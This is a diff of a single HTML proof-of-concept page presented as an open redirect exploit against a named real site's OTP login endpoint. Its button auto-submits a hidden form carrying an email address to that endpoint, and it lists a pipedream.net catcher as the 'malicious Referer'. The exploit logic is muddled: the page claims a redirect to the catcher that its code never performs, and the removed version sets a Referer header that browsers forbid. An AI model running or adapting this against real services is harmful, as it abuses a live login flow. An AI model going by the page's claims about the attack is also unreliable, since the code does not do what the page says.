@@ -1,26 +1,57 @@
-<!-- Open Redirect PoC Code -->
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Open Redirect PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gameboost Open Redirect PoC</title>
+    <style>
+        body { font-family: Arial; margin: 50px; background: #f0f0f0; }
+        .container { background: white; padding: 20px; border-radius: 5px; max-width: 700px; margin: 0 auto; }
+        button { background: #d32f2f; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background: #b71c1c; }
+        .warning { background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107; margin: 10px 0; }
+        #status { margin: 20px 0; padding: 15px; border-radius: 4px; }
+    </style>
 </head>
 <body>
-    <h1>Open Redirect Demonstration</h1>
-    <p>This PoC demonstrates an open redirect vulnerability.</p>
-    <script>
-        // Automatic redirect trigger
-        function redirect(url) {
-            // Manipulating the Referer header using Pipedream integration
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.setRequestHeader('Referer', 'https://malicious-site.com');
-            xhr.send();
-        }
+    <div class="container">
+        <h1>🔓 Gameboost Open Redirect PoC</h1>
+        
+        <div class="warning">
+            <strong>🎯 Target:</strong> https://gameboost.com/otp/send-login<br>
+            <strong>🔴 Malicious Referer:</strong> https://eo74rbqu36go8g.m.pipedream.net<br>
+            <strong>⚙️ Attack Method:</strong> Referer Header Manipulation
+        </div>
 
-        // Triggering the redirect with an attack flow
-        const targetUrl = 'https://example.com'; // Change to the target URL
-        redirect(targetUrl);
+        <h3>Click Button to Execute Exploit:</h3>
+        <button onclick="exploit()">▶ EXECUTE OPEN REDIRECT ATTACK</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        function exploit() {
+            const status = document.getElementById('status');
+            status.innerHTML = '<p style="background: #d4edda; color: #155724; padding: 10px; border-radius: 4px;"><strong>✓ EXPLOIT EXECUTED!</strong><br>Sending request to gameboost.com with malicious Referer header...<br>Redirecting to: https://eo74rbqu36go8g.m.pipedream.net<br><br>Status: REDIRECTING IN 2 SECONDS...</p>';
+            
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = 'https://gameboost.com/otp/send-login';
+            form.referrerPolicy = 'unsafe-url';
+            form.style.display = 'none';
+            
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'email';
+            input.value = 'mdshakopr@gmail.com';
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            
+            setTimeout(() => {
+                form.submit();
+            }, 2000);
+        }
     </script>
 </body>
 </html>
